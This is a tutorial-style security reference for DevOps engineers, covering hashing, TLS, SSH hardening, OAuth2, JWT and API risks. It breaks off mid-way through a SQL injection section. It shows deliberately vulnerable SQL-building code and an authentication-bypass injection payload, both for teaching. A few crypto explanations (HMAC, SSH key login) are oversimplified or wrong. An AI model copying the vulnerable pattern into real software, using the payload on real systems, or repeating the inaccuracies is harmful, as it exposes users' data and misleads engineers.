# Security Fundamentals
### A Complete Reference for DevOps Engineers

> **How to use this document:** Security is not a product you install — it's a mindset you build. This document covers every security concept a DevOps engineer should be able to explain confidently. Read it top to bottom first, then use it as a reference when you encounter these topics at work.

---

## Table of Contents

1. [Why Security Matters for DevOps Engineers](#1-why-security-matters-for-devops-engineers)
2. [Core Security Principles](#2-core-security-principles)
3. [Authentication vs Authorization](#3-authentication-vs-authorization)
4. [Passwords & Hashing](#4-passwords--hashing)
5. [Encryption — Symmetric & Asymmetric](#5-encryption--symmetric--asymmetric)
6. [PKI — Public Key Infrastructure](#6-pki--public-key-infrastructure)
7. [TLS Deep Dive — What Actually Happens](#7-tls-deep-dive--what-actually-happens)
8. [SSH Security — Beyond Just Connecting](#8-ssh-security--beyond-just-connecting)
9. [OAuth2 & OpenID Connect](#9-oauth2--openid-connect)
10. [JWT — JSON Web Tokens](#10-jwt--json-web-tokens)
11. [API Security](#11-api-security)
12. [Common Attack Vectors — What They Are and How They Work](#12-common-attack-vectors--what-they-are-and-how-they-work)
13. [SQL Injection](#13-sql-injection)
14. [XSS — Cross-Site Scripting](#14-xss--cross-site-scripting)
15. [CSRF — Cross-Site Request Forgery](#15-csrf--cross-site-request-forgery)
16. [SSRF — Server-Side Request Forgery](#16-ssrf--server-side-request-forgery)
17. [Secrets Management](#17-secrets-management)
18. [Linux System Security](#18-linux-system-security)
19. [Network Security](#19-network-security)
20. [Container & Kubernetes Security](#20-container--kubernetes-security)
21. [Logging, Auditing & Monitoring for Security](#21-logging-auditing--monitoring-for-security)
22. [Security in CI/CD Pipelines](#22-security-in-cicd-pipelines)
23. [Compliance Concepts — OWASP, CIS, SOC2](#23-compliance-concepts--owasp-cis-soc2)
24. [Quick Reference Cheat Sheet](#24-quick-reference-cheat-sheet)

---

## 1. Why Security Matters for DevOps Engineers

Many DevOps engineers think security is "the security team's job." That mindset is what causes breaches.

In modern infrastructure, DevOps engineers:
- Write the pipelines that deploy code → a compromised pipeline = compromised production
- Manage cloud infrastructure → misconfigured S3 buckets have leaked millions of records
- Handle secrets and credentials → leaked API keys cost companies millions
- Build container environments → a misconfigured container can become a foothold for attackers
- Control access to production systems → poor access management = insider threats

**DevSecOps** is the practice of embedding security into every stage of development and operations — not as an afterthought at the end.

The cost of fixing a security issue:
```
At design time:    $1
During development: $10
In QA/testing:     $100
In production:     $10,000+
After a breach:    $10,000,000+
```

You don't need to be a penetration tester. You need to understand how attacks work well enough to build defenses against them.

---

## 2. Core Security Principles

These are the foundational concepts that everything else in security is built on.

### CIA Triad

The three pillars of information security:

```
         Confidentiality
              /\
             /  \
            /    \
           /      \
          /________\
    Integrity    Availability
```

**Confidentiality** — Information is accessible only to those authorized to see it.
- Mechanisms: Encryption, access control, authentication
- Violation example: An attacker reads your database of user emails

**Integrity** — Information is accurate and has not been tampered with.
- Mechanisms: Hashing, digital signatures, checksums, audit logs
- Violation example: An attacker modifies a financial transaction in transit

**Availability** — Systems and data are accessible when needed by authorized users.
- Mechanisms: Redundancy, backups, DDoS protection, load balancing
- Violation example: A DDoS attack takes down your payment system

Every security decision is a tradeoff between these three. Maximum encryption improves confidentiality but can reduce availability (performance). More access controls improve confidentiality but reduce availability (harder to access).

### The AAA Framework

**Authentication** — Who are you? (Prove your identity)
**Authorization** — What are you allowed to do? (Prove your permissions)
**Accounting/Auditing** — What did you do? (Record your actions)

### Principle of Least Privilege (PoLP)

> Give every user, process, and system only the minimum permissions needed to do their job — nothing more.

Examples:
- A web server should not run as root
- A database backup script needs only SELECT, not DROP TABLE
- A CI/CD pipeline should only deploy to staging, not modify production IAM roles
- An employee in accounting should not have access to the engineering secrets vault

### Defense in Depth

Don't rely on a single security control. Layer multiple defenses so that if one fails, others protect you.

```
Internet
   ↓
WAF (Web Application Firewall) — blocks known attacks
   ↓
Load Balancer — DDoS mitigation
   ↓
Network Firewall — IP/port filtering
   ↓
Security Groups — instance-level traffic control
   ↓
Application — input validation, authentication
   ↓
Database — access controls, encryption at rest
   ↓
Audit Logs — detect anomalous behavior
```

If an attacker bypasses the WAF, they still hit the network firewall. If they bypass that, they still need to authenticate to the app. Defense in depth means no single failure is catastrophic.

### Zero Trust

Traditional security assumed: "Everything inside our network is trusted."
**Zero Trust** says: "Trust nothing and no one by default — verify everything, regardless of location."

Principles:
- Verify every user and device before granting access
- Grant least-privilege access, regardless of network location
- Assume breach — design as if attackers are already inside
- Continuously monitor and validate

This is why VPNs alone are no longer sufficient — a compromised machine inside the VPN gets free access to everything. Zero trust adds identity verification at every step.

### Fail Securely

When a system fails, it should fail in a secure state.

- If authentication system is down → deny access (not allow it)
- If a firewall crashes → block all traffic (not allow it)
- If input validation fails → reject the input (not process it)

---

## 3. Authentication vs Authorization

This is one of the most commonly confused pairs in security.

### Authentication (AuthN) — "Who are you?"

Authentication is **verifying identity** — proving that you are who you claim to be.

**Factors of authentication:**
- **Something you know** — Password, PIN, security question
- **Something you have** — Phone (TOTP app), hardware token (YubiKey), smart card
- **Something you are** — Biometrics (fingerprint, face, iris)

**Single-factor authentication (SFA):** One factor (usually just a password)
**Multi-factor authentication (MFA):** Two or more factors combined

Why MFA matters: Even if an attacker steals your password, they still need your phone (or hardware token) to log in. A leaked password alone is not enough.

**Authentication methods:**
| Method | How it works | Strength |
|---|---|---|
| Password | Shared secret both sides know | Weak alone |
| API Key | Long random string used in requests | Medium — can be stolen |
| Certificate | Asymmetric crypto — proves private key ownership | Strong |
| TOTP | Time-based one-time password (Google Authenticator) | Strong |
| Hardware token | Physical device generates code | Very strong |
| Biometrics | Fingerprint, face recognition | Strong but privacy concerns |
| OAuth | Delegate authentication to a trusted identity provider | Strong |

### Authorization (AuthZ) — "What are you allowed to do?"

Authorization is **verifying permissions** — determining what an authenticated user is allowed to do.

You can be perfectly authenticated (you are who you say you are) but still be **unauthorized** to perform certain actions.

```
You log in to AWS (authentication ✓)
You try to delete an S3 bucket (authorization check)
→ IAM policy says you don't have s3:DeleteBucket permission
→ Access denied (authorization ✗)
```

**Authorization models:**

**RBAC (Role-Based Access Control):**
Permissions are assigned to roles, users are assigned to roles.
```
Role: "developer"       Role: "admin"
Permissions:            Permissions:
  - read:code             - all developer perms
  - write:code            - deploy:production
  - deploy:staging        - manage:users
```
Examples: AWS IAM roles, Kubernetes RBAC, GitHub team permissions

**ABAC (Attribute-Based Access Control):**
Access decisions based on attributes of user, resource, and environment.
```
"Allow if: user.department == resource.department AND time.hour < 18"
```
More flexible than RBAC but more complex.

**ACL (Access Control List):**
Each resource has a list of who can access it and how.
```
file.txt:
  alice → read, write
  bob   → read
  others → none
```
Unix file permissions are a simple ACL.

### The HTTP Distinction

In HTTP terms:
- **401 Unauthorized** → Authentication failed (not logged in, or credentials invalid). Despite the name, it's an authentication error.
- **403 Forbidden** → Authorization failed (logged in, but you don't have permission). This is the true authorization error.

---

## 4. Passwords & Hashing

### Why Passwords Are Never Stored in Plain Text

If a database stores passwords as plain text and gets breached, every user's password is immediately exposed. Since people reuse passwords, attackers can then access users' other accounts (email, banking, etc.).

Instead, passwords are processed through a **hash function** before storage. When a user logs in, the entered password is hashed and compared to the stored hash.

### What is Hashing?

A **hash function** takes input of any size and produces a fixed-size output (the hash or digest). Critical properties:
- **One-way:** You cannot reverse a hash back to the original input
- **Deterministic:** Same input always produces the same hash
- **Avalanche effect:** A tiny change in input produces a completely different hash
- **Collision resistant:** Two different inputs should not produce the same hash

```
SHA-256("password123")   = ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f
SHA-256("password124")   = 5efc2b...  ← completely different
SHA-256("password123")   = ef92b778... ← always the same
```

### The Problem with Basic Hashing — Rainbow Tables

If you hash every common password in advance and store the hash → plaintext mapping, you get a **rainbow table**. Attacker gets your hashed database, looks up the hash → instantly finds the password.

`MD5("password") = 5f4dcc3b5aa765d61d8327deb882cf99`

Every attacker in the world knows this hash. Looking it up in a precomputed table takes milliseconds.

### The Solution: Salting

A **salt** is a random value added to the password before hashing:
```
salt     = random_bytes(16)  → "a7f3b9c2..."
hash     = hash(password + salt)
store    = salt + hash
```

The salt is stored alongside the hash (it doesn't need to be secret). Now:
- Two users with the same password get different hashes (different salts)
- Precomputed rainbow tables are useless (they'd have to rebuild them for every possible salt)
- Attacker must brute-force each password hash individually

### Password Hashing Algorithms — Use These, Not MD5/SHA

Regular hash functions (MD5, SHA-1, SHA-256) are designed to be **fast**. For password hashing, you want **slow** — making brute-force attacks impractical.

| Algorithm | Description | Use? |
|---|---|---|
| **bcrypt** | Slow by design, work factor adjustable, has salt built-in | ✅ Yes |
| **Argon2** | Winner of Password Hashing Competition 2015. Best choice today | ✅ Yes (preferred) |
| **scrypt** | Memory-hard (requires lots of RAM to compute) | ✅ Yes |
| **PBKDF2** | Widely supported, used in many standards | ✅ Acceptable |
| **SHA-256** | Fast — terrible for passwords | ❌ Never for passwords |
| **MD5** | Broken and fast | ❌ Absolutely never |
| **SHA-1** | Cryptographically broken | ❌ Never |

**Work factor:** bcrypt/Argon2 have a configurable cost factor. Higher = slower to compute = harder to brute-force. Adjust so that hashing takes ~100–300ms on your hardware. As hardware gets faster, increase the factor.

### Hashing vs Encryption

This distinction is critical:

| | Hashing | Encryption |
|---|---|---|
| **Reversible?** | No — one-way | Yes — with the key |
| **Purpose** | Verify integrity, store passwords | Protect data for later retrieval |
| **Use for passwords?** | Yes (with bcrypt/Argon2) | No — if you can decrypt it, so can an attacker with the key |

Never encrypt passwords. Hash them. Encryption implies you can decrypt — for passwords, you never need the original; you only need to verify.

### HMAC — Hash-based Message Authentication Code

**HMAC** combines a hash function with a secret key to produce a message authentication code.

```
HMAC(key, message) = hash(key + message)
```

Used to:
- Verify message integrity AND authenticity (only someone with the key can produce the correct HMAC)
- Sign JWT tokens (HMAC-SHA256)
- API request signing (AWS Signature V4)

---

## 5. Encryption — Symmetric & Asymmetric

### Symmetric Encryption

One key for both encrypting and decrypting. Both parties must have the same key.

```
Plaintext → [Encrypt with Key] → Ciphertext → [Decrypt with Key] → Plaintext
```

**Pros:** Very fast — good for large amounts of data
**Cons:** Key distribution problem — how do you securely share the key with the other party?

Common algorithms:
- **AES (Advanced Encryption Standard):** The gold standard. AES-256 is used everywhere.
  - **AES-256-GCM:** Authenticated encryption — provides both confidentiality AND integrity
  - **AES-256-CBC:** Older mode — needs a separate MAC for integrity
- **ChaCha20-Poly1305:** Modern, fast, used in TLS 1.3, WireGuard

```bash
# Encrypt a file with AES-256-CBC
openssl enc -aes-256-cbc -salt -in plaintext.txt -out encrypted.bin -k mypassword

# Decrypt
openssl enc -aes-256-cbc -d -in encrypted.bin -out decrypted.txt -k mypassword
```

### Asymmetric Encryption (Public Key Cryptography)

Two mathematically linked keys: a **public key** (share freely) and a **private key** (keep secret).

```
Encrypt with PUBLIC key  → only PRIVATE key can decrypt  (confidentiality)
Sign with PRIVATE key    → only PUBLIC key can verify     (authenticity)
```

**The key insight:**
- If Alice wants to send Bob a secret message: Alice encrypts with Bob's public key → only Bob's private key can decrypt it → only Bob can read it
- If Bob wants to prove he wrote a document: Bob signs with his private key → anyone with Bob's public key can verify Bob wrote it

**Pros:** Solves key distribution (public key is... public) — no need to securely share a secret key in advance
**Cons:** Much slower than symmetric — not suitable for bulk data encryption

Common algorithms:
- **RSA:** Most widely deployed, key sizes 2048 or 4096 bits
- **ECDSA / ECDH (Elliptic Curve):** Smaller keys, same security as RSA, faster — preferred in modern systems
- **Ed25519:** Modern elliptic curve — used in SSH keys, very fast, secure

```bash
# Generate RSA key pair
openssl genrsa -out private.pem 4096
openssl rsa -in private.pem -pubout -out public.pem

# Generate Ed25519 key pair (for SSH)
ssh-keygen -t ed25519 -C "your_email@example.com"

# Encrypt with public key, decrypt with private key
openssl rsautl -encrypt -inkey public.pem -pubin -in message.txt -out message.enc
openssl rsautl -decrypt -inkey private.pem -in message.enc -out message.dec
```

### How They Work Together — Hybrid Encryption

Real systems use both:
1. **Asymmetric encryption** to securely exchange a symmetric key (solves key distribution)
2. **Symmetric encryption** with that key for all actual data (fast)

This is exactly how TLS works:
- Asymmetric crypto negotiates the session key
- AES (symmetric) encrypts all the actual HTTP data

---

## 6. PKI — Public Key Infrastructure

**PKI** is the system of standards, procedures, and technologies that manages digital certificates and public-key encryption.

### The Problem PKI Solves

Asymmetric encryption is great, but there's a catch: **How do you know a public key actually belongs to who it claims to?**

If you download "Google's public key" from some website, how do you know it's actually Google's and not an attacker's? If you use an attacker's key thinking it's Google's → man-in-the-middle attack.

**PKI solves this with digital certificates.**

### Digital Certificates

A **digital certificate** is a digital document that:
1. Contains an entity's **public key**
2. States the **identity** of the owner (domain, organization)
3. Has a **validity period** (not before / not after)
4. Is **digitally signed** by a Certificate Authority (CA)

The CA's signature is the seal of trust: "I, a trusted authority, have verified that this public key belongs to this entity."

```
Certificate for www.google.com:
  Subject:        CN=www.google.com
  Issuer:         GTS CA 1C3 (Google's intermediate CA)
  Valid From:     2024-01-01
  Valid To:       2024-04-01
  Public Key:     RSA 2048-bit: 3082010A...
  Signature:      (GTS CA 1C3's digital signature of all the above)
```

### Certificate Authorities (CAs)

A **Certificate Authority** is a trusted organization that issues digital certificates.

**Root CAs:**
- Self-signed (they sign their own certificates — trust starts here)
- Their public keys are pre-installed in browsers and operating systems (~100 root CAs)
- Examples: DigiCert, Sectigo, Let's Encrypt, Entrust, GlobalSign

**Intermediate CAs:**
- Signed by a root CA
- Actually issue end-entity certificates
- Root CAs stay offline for security — intermediates do the day-to-day work

**The Chain of Trust:**
```
Root CA (DigiCert) — self-signed, trusted by browsers
    └── Intermediate CA (DigiCert TLS RSA SHA256 2020 CA1) — signed by Root
            └── Your domain certificate (example.com) — signed by Intermediate
```

To verify `example.com`'s certificate:
1. Check that example.com's cert is signed by the intermediate CA
2. Check that the intermediate CA is signed by DigiCert root
3. Check that DigiCert root is in the browser's trusted store
4. Chain verified → connection trusted

### Certificate Fields You'll See

```bash
openssl x509 -in cert.pem -noout -text
```

Key fields:
- **Subject:** Who the certificate belongs to (CN = Common Name, SAN = Subject Alternative Names)
- **Issuer:** Who signed this certificate
- **Validity:** notBefore / notAfter
- **Subject Alternative Names (SAN):** Other domains this cert is valid for (e.g., `*.google.com`, `google.com`)
- **Key Usage:** What the key can be used for (digitalSignature, keyEncipherment)
- **Basic Constraints:** Is this cert allowed to sign other certs? (CA: TRUE/FALSE)

### Certificate Types

| Type | Description | Common Use |
|---|---|---|
| **DV (Domain Validated)** | CA only verifies domain ownership | Most HTTPS sites |
| **OV (Organization Validated)** | CA verifies domain + organization identity | Business websites |
| **EV (Extended Validation)** | Thorough vetting of organization | Banks, high-security sites |
| **Wildcard** | `*.example.com` — valid for all subdomains | Multiple subdomains |
| **SAN/Multi-domain** | Valid for multiple specific domains | example.com + example.org |
| **Self-signed** | Signed by itself — no CA vouching for it | Internal services, dev/test |

### Certificate Lifecycle

```
Generate CSR (Certificate Signing Request)
  ↓
Submit CSR to CA
  ↓
CA validates identity (domain ownership, org info)
  ↓
CA issues signed certificate
  ↓
Install certificate on server
  ↓
Certificate expires (renew before expiry!)
```

```bash
# Generate private key and CSR
openssl req -new -newkey rsa:2048 -nodes -keyout private.key -out request.csr

# Check CSR contents
openssl req -in request.csr -noout -text

# Check certificate expiry
openssl x509 -in cert.pem -noout -enddate
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates
```

---

## 7. TLS Deep Dive — What Actually Happens

You saw TLS in the networking document. Here we go deeper into the security details.

### What TLS Protects Against

| Threat | How TLS Defends |
|---|---|
| **Eavesdropping** | All data is encrypted — interceptors see gibberish |
| **Man-in-the-Middle (MITM)** | Certificate + CA chain proves server identity |
| **Tampering** | MAC/AEAD ensures any modification is detected |
| **Replay attacks** | Session keys are unique per connection + nonces |

### TLS 1.3 Handshake (Current Standard)

TLS 1.3 (2018) is significantly faster than TLS 1.2 — one round-trip instead of two:

```
Client                              Server
  │                                    │
  │───── ClientHello ─────────────────→│
  │  - Supported TLS versions           │
  │  - Key shares (ECDH public keys)    │
  │  - Supported cipher suites          │
  │  - Random nonce                     │
  │                                    │
  │←──── ServerHello ─────────────────│
  │  - Chosen cipher suite             │
  │  - Server's ECDH key share         │
  │  - Server certificate              │
  │  - CertificateVerify (proves       │
  │    server has private key)          │
  │  - Finished (HMAC over handshake)  │
  │                                    │
  │  Both sides now derive:            │
  │  session key = ECDH(client_priv,   │
  │                     server_pub)    │
  │                                    │
  │───── Finished ────────────────────→│
  │  (HMAC over handshake to verify)   │
  │                                    │
  │════ Encrypted Application Data ════│
```

**0-RTT (Zero Round-Trip Time):** TLS 1.3 supports resuming previous sessions with zero additional handshake round-trips. The client sends data in the first message. Tradeoff: slight replay attack risk.

### Perfect Forward Secrecy (PFS)

**PFS** means that if an attacker records encrypted traffic today, and later compromises the server's private key, they still cannot decrypt the old traffic.

How: TLS 1.3 uses **ephemeral ECDH key exchange** — temporary keys generated for each session. Even if the server's long-term private key is compromised, it cannot decrypt past sessions (those temporary keys are gone).

TLS 1.2 without PFS: Uses the server's private key directly for key exchange. Compromise the key → decrypt all past sessions.

### Common TLS Vulnerabilities (Know These Names)

| Vulnerability | What it is | TLS versions affected |
|---|---|---|
| **POODLE** | Exploits SSLv3 padding | SSLv3 — disable SSLv3 |
| **BEAST** | CBC mode attack | TLS 1.0 — use TLS 1.2+ |
| **HEARTBLEED** | OpenSSL buffer over-read — leaked memory | Affected OpenSSL 1.0.1-1.0.1f |
| **DROWN** | SSLv2 cross-protocol attack | Affects any server sharing key with SSLv2 server |
| **CRIME/BREACH** | Compression oracle attack | TLS with compression — disable compression |

Mitigation: Use TLS 1.2 minimum, TLS 1.3 preferred. Disable old protocols.

```bash
# Check what TLS versions a server supports
nmap --script ssl-enum-ciphers -p 443 example.com

# Test with specific TLS version
openssl s_client -connect example.com:443 -tls1_3
openssl s_client -connect example.com:443 -tls1_2

# Quick security check with testssl.sh
./testssl.sh example.com
```

---

## 8. SSH Security — Beyond Just Connecting

SSH is the protocol you use daily. Most people just use it — let's understand the security deeply.

### SSH Authentication Methods

**Password authentication:**
- Password sent encrypted over the SSH session
- Vulnerable to brute-force attacks
- **Best practice: Disable it** on production servers

**Public key authentication:**
1. User generates a key pair: `ssh-keygen -t ed25519`
2. Public key added to server's `~/.ssh/authorized_keys`
3. When connecting: Server sends a challenge encrypted with user's public key
4. Client decrypts with private key and responds → proves private key possession
5. No password ever sent

**Certificate-based SSH:**
- CA issues certificates to users and hosts
- Scales better than managing `authorized_keys` files
- Host certificates prevent "trust on first use" prompts

### Generating Secure SSH Keys

```bash
# Recommended: Ed25519 (modern, small, fast, secure)
ssh-keygen -t ed25519 -C "your_email@example.com"

# Acceptable: RSA 4096 (legacy compatibility)
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"

# Avoid: DSA (deprecated), RSA < 2048, ECDSA with NIST curves (potential backdoor concerns)
```

Always set a **passphrase** on your private key. The passphrase encrypts the private key file — even if your laptop is stolen, the key is useless without the passphrase.

### Hardening SSH Server Config (/etc/ssh/sshd_config)

```ini
# Disable root login — use a regular user + sudo instead
PermitRootLogin no

# Disable password authentication — keys only
PasswordAuthentication no
ChallengeResponseAuthentication no
UsePAM no

# Only allow specific users
AllowUsers alice bob deploy

# Use strong key exchange algorithms only
KexAlgorithms curve25519-sha256,diffie-hellman-group16-sha512

# Use strong ciphers only
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com

# Log level for auditing
LogLevel VERBOSE

# Disconnect idle sessions after 10 minutes
ClientAliveInterval 300
ClientAliveCountMax 2

# Disable X11 forwarding (not needed on servers)
X11Forwarding no

# Change default port (minor security through obscurity — reduces noise in logs)
# Port 2222   ← optional, reduces automated scans hitting port 22
```

```bash
# Apply changes
systemctl restart sshd

# Test config before restarting (to avoid locking yourself out)
sshd -t   # Test configuration syntax
```

### SSH Port Forwarding — Security Implications

SSH can create tunnels. Understand these because they can be used for both legitimate purposes and to bypass security controls:

```bash
# Local port forwarding: Access remote service via local port
# "Forward my local port 5432 to remote's localhost:5432"
# Use case: Access a database that only allows connections from the server
ssh -L 5432:localhost:5432 user@server

# Remote port forwarding: Expose local service through remote
# "Forward remote port 8080 to my local port 3000"
# Use case: Demo local dev server to a client (bypass NAT/firewall)
ssh -R 8080:localhost:3000 user@server

# Dynamic port forwarding: SOCKS proxy through SSH
# "Route all my browser traffic through the remote server"
ssh -D 1080 user@server
```

> **Security concern:** SSH tunnels can bypass firewalls. If an attacker gets SSH access, they can tunnel arbitrary traffic. Audit who has SSH access carefully.

---

## 9. OAuth2 & OpenID Connect

These are the protocols behind "Login with Google / GitHub / Apple." As a DevOps engineer, you'll encounter them when setting up access to internal tools, CI/CD systems, and cloud resources.

### The Problem OAuth2 Solves

Before OAuth: If App X wanted to access your Gmail, it needed your Gmail username and password. App X now has your credentials — dangerous if App X is malicious or gets breached.

**OAuth2** allows you to grant App X limited access to your Gmail **without giving App X your password**. You authorize Google to give App X a token that only allows reading emails — not sending, not deleting, not changing password.

### OAuth2 Roles

| Role | Description | Example |
|---|---|---|
| **Resource Owner** | The user who owns the data | You |
| **Client** | The app wanting access | A third-party app |
| **Authorization Server** | Issues access tokens after authentication | Google's OAuth server |
| **Resource Server** | The API with the protected data | Google's Gmail API |

### OAuth2 Authorization Code Flow (Most Secure)

```
User clicks "Login with Google" in App X
              ↓
App X redirects to Google's authorization endpoint:
GET https://accounts.google.com/o/oauth2/auth?
    client_id=APP_X_ID
    &redirect_uri=https://appx.com/callback
    &response_type=code
    &scope=email+profile
    &state=random_csrf_token
              ↓
User logs in to Google (not to App X — Google handles authentication)
              ↓
User sees consent screen: "App X wants to read your email address"
User approves
              ↓
Google redirects to App X's callback URL with an authorization code:
GET https://appx.com/callback?code=AUTH_CODE&state=random_csrf_token
              ↓
App X sends code to its backend server
App X server exchanges code for tokens (server-to-server, secret):
POST https://oauth2.googleapis.com/token
    code=AUTH_CODE
    client_id=APP_X_ID
    client_secret=APP_X_SECRET
              ↓
Google returns:
{
    "access_token": "ya29.A0AR...",   ← Use this to call APIs
    "refresh_token": "1//0eBG...",    ← Use this to get new access tokens
    "expires_in": 3600,               ← Access token valid for 1 hour
    "token_type": "Bearer"
}
              ↓
App X calls Gmail API with the access token:
GET https://gmail.googleapis.com/gmail/v1/users/me/messages
Authorization: Bearer ya29.A0AR...
```

### OAuth2 Scopes

**Scopes** define what access is being requested. They embody the principle of least privilege.

```
read:user          → Read your profile information
repo               → Full access to repositories  
repo:status        → Only access commit statuses
email              → Access email address
openid profile     → OpenID Connect standard scopes
```

Request the minimum scopes needed. Don't request write access if you only need read.

### OpenID Connect (OIDC)

**OIDC** is an identity layer on top of OAuth2. OAuth2 is for authorization (access to resources). OIDC adds **authentication** (who is the user?).

OIDC adds an **ID Token** (a JWT — see next section) containing user identity information:
```json
{
    "iss": "https://accounts.google.com",
    "sub": "1234567890",         ← User's unique ID
    "email": "user@gmail.com",
    "name": "John Doe",
    "picture": "https://...",
    "iat": 1516239022,           ← Issued at
    "exp": 1516242622            ← Expires at
}
```

OIDC is used by: SSO (Single Sign-On), Kubernetes OIDC authentication, GitHub Actions OIDC for keyless authentication to AWS/GCP.

### OAuth2 in DevOps — Practical Examples

```bash
# GitHub Actions using OIDC to authenticate to AWS (no long-lived credentials!)
# In your workflow:
jobs:
  deploy:
    permissions:
      id-token: write    # Required for OIDC
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/GitHubActionsRole
          aws-region: us-east-1
          # No AWS_ACCESS_KEY needed — OIDC JWT proves identity
```

---

## 10. JWT — JSON Web Tokens

**JWT (JSON Web Token)** is a compact, self-contained token format used to securely transmit information between parties.

### JWT Structure

A JWT is three base64url-encoded sections separated by dots:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyNDI2MjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

HEADER.PAYLOAD.SIGNATURE
```

**Header:** Algorithm and token type
```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```

**Payload:** Claims — the data
```json
{
  "sub": "1234567890",         // Subject (user ID)
  "name": "John Doe",
  "email": "john@example.com",
  "role": "admin",
  "iat": 1516239022,           // Issued at (Unix timestamp)
  "exp": 1516242622,           // Expiry (Unix timestamp)
  "iss": "https://auth.example.com"  // Issuer
}
```

**Signature:**
- For HMAC: `HMAC-SHA256(base64url(header) + "." + base64url(payload), secret)`
- For RSA: `RSA-Sign(base64url(header) + "." + base64url(payload), private_key)`

The signature **verifies the token wasn't tampered with**. You cannot change the payload without invalidating the signature.

### JWT vs Session Cookies

| | JWT (Stateless) | Session Cookie (Stateful) |
|---|---|---|
| **State stored** | In the token (client-side) | In server memory/database |
| **Scalability** | Easy — any server can verify | Needs shared session store |
| **Revocation** | Hard — can't invalidate until expiry | Easy — delete from session store |
| **Size** | Larger (~200-1000 bytes) | Small (just a session ID) |
| **Inspection** | Server can read claims without DB lookup | Requires DB lookup |

### Critical JWT Security Issues

#### Never store sensitive data in JWT payload
The payload is **base64-encoded, not encrypted**. Anyone who has the token can decode and read it.

```bash
# Anyone can decode a JWT payload:
echo "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0" | base64 -d
# Output: {"sub":"1234567890","name":"John Doe"}
```

Don't store: passwords, secrets, PII beyond what's necessary.

#### The `alg: none` Attack
Early JWT libraries accepted `"alg": "none"` — meaning no signature required. An attacker could craft a JWT with any claims and set alg to none.

Always explicitly validate the expected algorithm. Never trust the `alg` field in the token header.

#### Always validate expiry (`exp`)
An expired token must be rejected. Never skip expiry checking.

#### Use short expiry + refresh tokens
- Access token: Short-lived (15 minutes to 1 hour)
- Refresh token: Long-lived, stored securely, used to get new access tokens
- If access token is compromised, damage is limited to its short lifetime

```bash
# Inspect a JWT online: https://jwt.io
# Or with command line:
jwt_payload=$(echo "your.jwt.token" | cut -d'.' -f2)
echo $jwt_payload | base64 -d 2>/dev/null | python3 -m json.tool
```

---

## 11. API Security

APIs are the attack surface of modern applications. Most modern breaches target APIs.

### API Authentication Methods

**API Keys:**
```
GET /api/data HTTP/1.1
X-API-Key: abc123secretkey
```
- Simple, widely used
- Rotate regularly
- Treat like passwords — never commit to code
- Use different keys per environment (dev/staging/prod)

**Bearer Tokens (JWT):**
```
GET /api/data HTTP/1.1
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9...
```
- Short-lived, can carry claims
- Server validates signature, no DB lookup needed

**Basic Auth (avoid in modern systems):**
```
GET /api/data HTTP/1.1
Authorization: Basic dXNlcjpwYXNzd29yZA==  (base64 of "user:password")
```
- Only acceptable over HTTPS
- Deprecated in most contexts — credentials sent every request

**mTLS (Mutual TLS):**
- Both client and server present certificates
- Used for service-to-service authentication in microservices
- Very strong — cryptographic identity verification

### OWASP API Security Top 10

Know these — they cover the most common API vulnerabilities:

1. **Broken Object Level Authorization (BOLA/IDOR)**
   User accesses another user's data by changing an ID:
   ```
   GET /api/orders/1234   → your order (OK)
   GET /api/orders/1235   → another user's order (vulnerability!)
   ```
   Fix: Verify the requesting user owns the requested resource.

2. **Broken Authentication**
   Weak tokens, tokens not expiring, no rate limiting on login attempts.

3. **Broken Object Property Level Authorization**
   User can update fields they shouldn't:
   ```json
   PUT /api/user/profile
   {"name": "Alice", "role": "admin"}  ← user should not set their own role
   ```

4. **Unrestricted Resource Consumption**
   No rate limiting, no request size limits → DoS, cost abuse.

5. **Broken Function Level Authorization**
   Admin endpoint accessible by regular users:
   ```
   GET /api/admin/users  → should require admin, but doesn't check
   ```

6. **Mass Assignment**
   Automatically binding request parameters to database objects without filtering.

7. **Security Misconfiguration**
   Unnecessary endpoints exposed, verbose error messages, debug mode in production.

8. **Lack of Protection from Automated Threats**
   No CAPTCHA, no rate limiting → credential stuffing, scraping.

9. **Improper Inventory Management**
   Old API versions still running and unpatched (`/api/v1/` is still live when `/api/v3/` is current).

10. **Unsafe Consumption of APIs**
    Trusting third-party API responses without validation.

### Rate Limiting

**Rate limiting** prevents abuse by limiting how many requests a client can make in a time window.

```nginx
# nginx rate limiting
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;

location /api/ {
    limit_req zone=api burst=20 nodelay;
    # 10 requests/second normally, allow bursts up to 20
}
```

Common rate limit headers in responses:
```
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 87
X-RateLimit-Reset: 1609459200
Retry-After: 30
```

---

## 12. Common Attack Vectors — What They Are and How They Work

Understanding attacks makes you better at defense. You don't need to be able to execute these — you need to understand them well enough to prevent them.

### The OWASP Top 10

The **OWASP Top 10** is the most widely referenced list of critical web application security risks. Updated periodically by the Open Web Application Security Project.

Current major categories:
1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQL, Command, etc.)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Server-Side Request Forgery (SSRF)

We'll cover the most important specific attacks in depth in the following sections.

---

## 13. SQL Injection

**SQL injection** is when an attacker inserts malicious SQL code into user input, which is then executed by the database.

### How It Works

Consider a login form that constructs a SQL query:

```python
# Vulnerable code
username = request.get("username")
password = request.get("password")
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

Normal input: `alice` / `secretpassword`
```sql
SELECT * FROM users WHERE username='alice' AND password='secretpassword'
-- Returns Alice's row if credentials are correct
```

Attacker input for username: `' OR '1'='1' --`
```sql
